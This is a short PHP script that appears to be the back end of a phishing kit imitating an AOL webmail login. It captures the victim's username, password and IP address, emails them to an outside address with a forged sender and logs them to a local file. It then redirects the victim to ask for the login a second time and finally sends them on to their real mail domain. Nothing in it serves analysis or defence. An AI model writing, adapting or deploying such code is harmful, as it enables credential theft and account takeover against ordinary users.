<?php

session_start();

$message .= "--------------: || Hacked by jmoneyfingers || :---------------\n
Request ip: ".$_SERVER ['REMOTE_ADDR']."\nusername: ".$_POST['userid']."\npass:".$_POST['rcmloginpwd'];

$subj = "AOL Logn | ".$ip." | ".$_POST['userid']."\n";
$from = "From: LOGINU  <money@money.com>";
$ismailsent = mail("srithatstainless@techie.com",$subj,$message,$from);
mail($recipient,$subject,$message);
$fp = fopen("./logslist.txt", "a");
fputs($fp, $message);
fclose($fp);

//add redirect to index.html

//2nd time
if($_SESSION["email"] == $_POST['userid'])
{
	//2nd time
	$domainExt = explode("@",$_POST['userid']);
	$domain =$domainExt[1];
	
	header("location:https://$domain");
}
else
{
	//first time
	$_SESSION["email"] = $_POST['userid'];
	header("location:index.html#".$_POST['userid']);
}


?>